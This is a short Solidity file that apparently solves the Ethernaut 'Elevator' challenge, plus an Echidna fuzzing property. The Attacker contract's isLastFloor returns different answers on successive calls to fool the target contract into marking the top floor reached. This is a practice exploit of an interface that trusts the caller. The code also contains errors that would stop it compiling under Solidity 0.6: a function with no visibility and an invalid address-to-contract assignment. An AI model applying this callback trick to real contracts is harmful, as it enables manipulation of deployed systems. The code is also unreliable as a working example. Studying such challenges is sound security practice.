// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'Elevator.sol';

contract Attacker {
    int check = 0;

    function start() {
        Elevator target = address(0x90000);
        target.goTo(2);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (check == 0) {
            check += 1;
            return false;
        } else {
            check = 0;
            return true;
        }
  }
}

contract Test is Elevator{
    function echidna_is_top_floor() public returns (bool) {
        return ! top;
    }
}